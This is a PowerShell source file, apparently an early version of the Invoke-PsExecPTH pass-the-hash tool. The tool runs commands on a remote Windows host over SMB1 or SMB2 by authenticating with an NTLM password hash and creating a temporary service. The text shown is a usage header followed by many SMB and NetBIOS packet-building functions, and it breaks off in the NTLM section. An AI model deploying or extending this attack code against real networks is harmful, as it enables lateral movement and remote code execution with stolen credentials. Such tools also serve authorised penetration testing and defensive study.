function Invoke-PsExecPTH
{
<#
.SYNOPSIS
Invoke-PsExecPTH performs PsExec style command execution with pass the hash authentication over NTLMv2. Invoke-PsExecPTH
supports SMB1 and SMB2 with or without SMB signing.

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for PsExec authentication. The user must be a local administrator on the target.

.PARAMETER Domain
Domain to use for PsExec authentication. This parameter is not needed with local accounts. 

.PARAMETER Hash
NTLM password hash for PsExec authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target.

.PARAMETER CommandCOMSPEC
Default = Enabled: Prepend %COMSPEC% /C to Command.

.PARAMETER Service
Default = 20 Character Random: Name of the service to create and delete on the target.

.PARAMETER SMB1
(Switch) Force SMB1. The default behaviour is to perform SMB version negotiation and use SMB2 if supported by the target.

.EXAMPLE
Invoke-PsExecPTH -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command to execute"

.LINK
https://github.com/Kevin-Robertson/Irken

#>
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][Switch]$SMB1
)

if($SMB1)
{
    $SMB_version = 'SMB1'
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function Get-PacketNetBIOSSessionService()
{
    param([Int]$packet_header_length,[Int]$packet_data_length)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
    $packet_netbios_session_service_length = $packet_netbios_session_service_length[2..0]
    $packet_NetBIOS_session_service = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NetBIOS_session_service.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
    $packet_NetBIOS_session_service.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

    return $packet_NetBIOS_session_service
}

#SMB1

function Get-PacketSMBHeader()
{
    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

    $packet_SMB_header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_header.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $packet_SMB_header.Add("SMBHeader_Command",$packet_command)
    $packet_SMB_header.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
    $packet_SMB_header.Add("SMBHeader_Reserved",[Byte[]](0x00))
    $packet_SMB_header.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
    $packet_SMB_header.Add("SMBHeader_Flags",$packet_flags)
    $packet_SMB_header.Add("SMBHeader_Flags2",$packet_flags2)
    $packet_SMB_header.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
    $packet_SMB_header.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB_header.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
    $packet_SMB_header.Add("SMBHeader_TreeID",$packet_tree_ID)
    $packet_SMB_header.Add("SMBHeader_ProcessID",$packet_process_ID)
    $packet_SMB_header.Add("SMBHeader_UserID",$packet_user_ID)
    $packet_SMB_header.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

    return $packet_SMB_header
}

function Get-PacketSMBNegotiateProtocolRequest()
{
    param([String]$packet_version)

    if($packet_version -eq 'SMB1')
    {
        [Byte[]]$packet_byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$packet_byte_count = 0x22,0x00  
    }

    $packet_SMB_negotiate_protocol_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
    $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
    $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($packet_version -ne 'SMB1')
    {
        $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $packet_SMB_negotiate_protocol_request.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $packet_SMB_negotiate_protocol_request
}

function Get-PacketSMBSessionSetupAndXRequest()
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_byte_count = $packet_byte_count[0,1]
    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
    $packet_security_blob_length = $packet_security_blob_length[0,1]
    $packet_SMB_session_setup_andx_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_WordCount",[Byte[]](0x0c))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_AndXCommand",[Byte[]](0xff))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_Reserved",[Byte[]](0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_MaxBuffer",[Byte[]](0xff,0xff))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_MaxMpxCount",[Byte[]](0x02,0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_VCNumber",[Byte[]](0x01,0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_SecurityBlobLength",$packet_byte_count)
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_ByteCount",$packet_security_blob_length)
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_SecurityBlob",$packet_security_blob)
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_NativeOS",[Byte[]](0x00,0x00,0x00))
    $packet_SMB_session_setup_andx_request.Add("SMBSessionSetupAndXRequest_NativeLANManage",[Byte[]](0x00,0x00))

    return $packet_SMB_session_setup_andx_request 
}

function Get-PacketSMBTreeConnectAndXRequest()
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
    $packet_path_length = $packet_path_length[0,1]
    $packet_SMB_tree_connect_andx_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)
    $packet_SMB_tree_connect_andx_request.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $packet_SMB_tree_connect_andx_request
}

function Get-PacketSMBNTCreateAndXRequest()
{
    param([Byte[]]$packet_named_pipe)

    [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]
    [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
    $packet_file_name_length = $packet_file_name_length[0,1]
    $packet_SMB_NT_create_andx_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)
    $packet_SMB_NT_create_andx_request.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)

    return $packet_SMB_NT_create_andx_request
}

function Get-PacketSMBReadAndXRequest()
{
    $packet_SMB_read_andx_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))
    $packet_SMB_read_andx_request.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMB_read_andx_request
}

function Get-PacketSMBWriteAndXRequest()
{
    param([Int]$packet_dcerpc_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_dcerpc_length + 24)
    $packet_write_length = $packet_write_length[0,1]

    $packet_SMB_write_andx_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_FID",[Byte[]](0x00,0x40))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_Remaining",[Byte[]](0x50,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB_write_andx_request.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)

    return $packet_SMB_write_andx_request
}

function Get-PacketSMBCloseRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB_close_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_close_request.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))
    $packet_SMB_close_request.Add("SMBCloseRequest_FID",$packet_file_ID)
    $packet_SMB_close_request.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMB_close_request.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMB_close_request
}

function Get-PacketSMBTreeDisconnectRequest()
{
    $packet_SMB_tree_disconnect_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_tree_disconnect_request.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))
    $packet_SMB_tree_disconnect_request.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMB_tree_disconnect_request
}

function Get-PacketSMBLogoffAndXRequest()
{
    $packet_SMB_logoff_andx_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB_logoff_andx_request.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))
    $packet_SMB_logoff_andx_request.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))
    $packet_SMB_logoff_andx_request.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))
    $packet_SMB_logoff_andx_request.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMB_logoff_andx_request.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMB_logoff_andx_request
}

#SMB2

function Get-PacketSMB2Header()
{
    param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

    $packet_SMB2_header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $packet_SMB2_header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
    $packet_SMB2_header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
    $packet_SMB2_header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
    $packet_SMB2_header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2_header.Add("SMB2Header_Command",$packet_command)
    $packet_SMB2_header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))
    $packet_SMB2_header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_header.Add("SMB2Header_MessageID",$packet_message_ID)
    $packet_SMB2_header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_header.Add("SMB2Header_TreeID",$packet_tree_ID)
    $packet_SMB2_header.Add("SMB2Header_SessionID",$packet_session_ID)
    $packet_SMB2_header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SMB2_header
}

function Get-PacketSMB2NegotiateProtocolRequest()
{
    $packet_SMB2_negotiate_protocol_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Dialects2",[Byte[]](0x10,0x02))

    return $packet_SMB2_negotiate_protocol_request
}

function Get-PacketSMB2SessionSetupRequest()
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_security_blob_length = $packet_security_blob_length[0,1]
    $packet_SMB2_session_setup_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2_session_setup_request.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

    return $packet_SMB2_session_setup_request 
}

function Get-PacketSMB2TreeConnectRequest()
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
    $packet_path_length = $packet_path_length[0,1]
    $packet_SMB2_tree_connect_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_tree_connect_request.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
    $packet_SMB2_tree_connect_request.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2_tree_connect_request.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
    $packet_SMB2_tree_connect_request.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
    $packet_SMB2_tree_connect_request.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

    return $packet_SMB2_tree_connect_request
}

function Get-PacketSMB2CreateRequestFile()
{
    param([Byte[]]$packet_named_pipe)

    $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]
    $packet_SMB2_create_request_file = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_create_request_file.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)

    return $packet_SMB2_create_request_file
}

function Get-PacketSMB2ReadRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2_read_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_read_request.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_FileID",$packet_file_ID)
    $packet_SMB2_read_request.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2_read_request.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

    return $packet_SMB2_read_request
}

function Get-PacketSMB2WriteRequest()
{
    param([Byte[]]$packet_file_ID,[Int]$packet_dcerpc_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_dcerpc_length + 24)

    $packet_SMB2_write_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_write_request.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_Length",$packet_write_length)
    $packet_SMB2_write_request.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_FileID",$packet_file_ID)
    $packet_SMB2_write_request.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2_write_request.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SMB2_write_request
}

function Get-PacketSMB2CloseRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2_close_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_close_request.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
    $packet_SMB2_close_request.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
    $packet_SMB2_close_request.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2_close_request.Add("SMB2CloseRequest_FileID",$packet_file_ID)

    return $packet_SMB2_close_request
}

function Get-PacketSMB2TreeDisconnectRequest()
{
    $packet_SMB2_tree_disconnect_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_tree_disconnect_request.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2_tree_disconnect_request.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2_tree_disconnect_request
}

function Get-PacketSMB2SessionLogoffRequest()
{
    $packet_SMB2_session_logoff_request = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2_session_logoff_request.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2_session_logoff_request.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2_session_logoff_request
}

#NTLM

function Get-PacketNTLMSSPNegotiate()
{
    param([Byte[]]$packet_negotiate_flags)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32) # add custom domain and name capability
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
